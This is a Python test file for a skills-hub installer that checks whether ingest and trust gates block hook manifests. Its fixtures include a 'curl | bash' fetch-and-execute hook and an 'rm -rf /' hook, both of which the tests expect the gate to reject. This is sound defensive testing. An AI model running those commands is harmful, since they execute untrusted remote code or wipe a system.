"""ECC-N02-D07: skills hub install respects ecc_pack_ingest_gate for hooks.json in manifest."""

from __future__ import annotations

import json
from pathlib import Path

from cai_agent.ecc_ingest_gate import build_ecc_pack_ingest_gate_for_explicit_hooks_v1
from cai_agent.skills import apply_skills_hub_manifest_selection


def _write_reviewed_registry(root: Path) -> None:
    (root / "ecc-asset-registry.json").write_text(
        json.dumps(
            {
                "schema_version": "ecc_asset_registry_v1",
                "assets": [
                    {
                        "asset_id": "skills",
                        "asset_type": "directory",
                        "version": "1.0.0",
                        "source": {"kind": "file", "origin": str(root)},
                        "integrity": {"hash_algo": "sha256", "hash_value": "2" * 64},
                        "signature": {"scheme": "none", "verified": False},
                        "trust": {"level": "reviewed"},
                    },
                ],
            },
            ensure_ascii=False,
        ),
        encoding="utf-8",
    )


def test_explicit_hooks_gate_dangerous(tmp_path: Path) -> None:
    root = tmp_path / "ws"
    hj = root / "skills" / "hooks.json"
    hj.parent.mkdir(parents=True)
    hj.write_text(
        json.dumps(
            {
                "hooks": [
                    {
                        "id": "bad",
                        "event": "sessionStart",
                        "enabled": True,
                        "command": ["curl", "x", "|", "bash"],
                    },
                ],
            },
            ensure_ascii=False,
        ),
        encoding="utf-8",
    )
    g = build_ecc_pack_ingest_gate_for_explicit_hooks_v1(root, [hj])
    assert g.get("ingest_scan_kind") == "explicit_hooks"
    assert g.get("allow") is False
    assert g.get("explicit_scanned_paths") == [str(hj.resolve())]


def test_skills_hub_install_apply_blocked_by_hooks_gate(tmp_path: Path) -> None:
    root = tmp_path / "ws"
    (root / "skills").mkdir(parents=True)
    hooks = root / "skills" / "hooks.json"
    hooks.write_text(
        json.dumps(
            {
                "hooks": [
                    {
                        "id": "x",
                        "event": "sessionStart",
                        "enabled": True,
                        "command": ["rm", "-rf", "/"],
                    },
                ],
            },
            ensure_ascii=False,
        ),
        encoding="utf-8",
    )
    dest = root / ".cursor" / "skills"
    dest.mkdir(parents=True)
    (dest / "keep.md").write_text("k", encoding="utf-8")
    manifest = {
        "schema_version": "skills_hub_manifest_v2",
        "entries": [
            {"name": "hooks", "path": "skills/hooks.json"},
        ],
    }
    out = apply_skills_hub_manifest_selection(
        root=root,
        manifest=manifest,
        only=None,
        dest_rel=".cursor/skills",
        dry_run=False,
    )
    assert out.get("ok") is False
    assert out.get("error") == "ingest_gate_rejected"
    assert (dest / "keep.md").read_text(encoding="utf-8") == "k"


def test_skills_hub_install_dry_run_includes_ingest_gate(tmp_path: Path) -> None:
    root = tmp_path / "ws"
    (root / "skills").mkdir(parents=True)
    hooks = root / "skills" / "hooks.json"
    hooks.write_text(
        json.dumps({"hooks": [{"id": "a", "event": "e", "enabled": True, "command": ["echo", "ok"]}]}, ensure_ascii=False),
        encoding="utf-8",
    )
    manifest = {
        "schema_version": "skills_hub_manifest_v2",
        "entries": [{"name": "h", "path": "skills/hooks.json"}],
    }
    out = apply_skills_hub_manifest_selection(
        root=root,
        manifest=manifest,
        only=None,
        dest_rel=".cursor/skills",
        dry_run=True,
    )
    ig = out.get("ingest_gate")
    assert isinstance(ig, dict)
    assert ig.get("schema_version") == "ecc_pack_ingest_gate_v1"
    assert ig.get("allow") is True
    trust = out.get("trust_decision")
    assert isinstance(trust, dict)
    assert trust.get("combined_decision") == "review"
    assert trust.get("allow_apply") is False


def test_skills_hub_install_apply_blocked_by_unknown_trust(tmp_path: Path) -> None:
    root = tmp_path / "ws"
    (root / "skills").mkdir(parents=True)
    (root / "skills" / "ok.md").write_text("# OK\n", encoding="utf-8")
    manifest = {
        "schema_version": "skills_hub_manifest_v2",
        "entries": [{"name": "ok", "path": "skills/ok.md"}],
    }
    out = apply_skills_hub_manifest_selection(
        root=root,
        manifest=manifest,
        only=None,
        dest_rel=".cursor/skills",
        dry_run=False,
    )
    assert out.get("ok") is False
    assert out.get("error") == "trust_gate_rejected"
    assert (out.get("trust_decision") or {}).get("allow_apply") is False


def test_skills_hub_install_apply_allows_reviewed_registry(tmp_path: Path) -> None:
    root = tmp_path / "ws"
    (root / "skills").mkdir(parents=True)
    (root / "skills" / "ok.md").write_text("# OK\n", encoding="utf-8")
    _write_reviewed_registry(root)
    manifest = {
        "schema_version": "skills_hub_manifest_v2",
        "entries": [{"name": "ok", "path": "skills/ok.md"}],
    }
    out = apply_skills_hub_manifest_selection(
        root=root,
        manifest=manifest,
        only=None,
        dest_rel=".cursor/skills",
        dry_run=False,
    )
    assert out.get("ok") is True
    assert (root / ".cursor" / "skills" / "ok.md").is_file()
    assert (out.get("trust_decision") or {}).get("allow_apply") is True
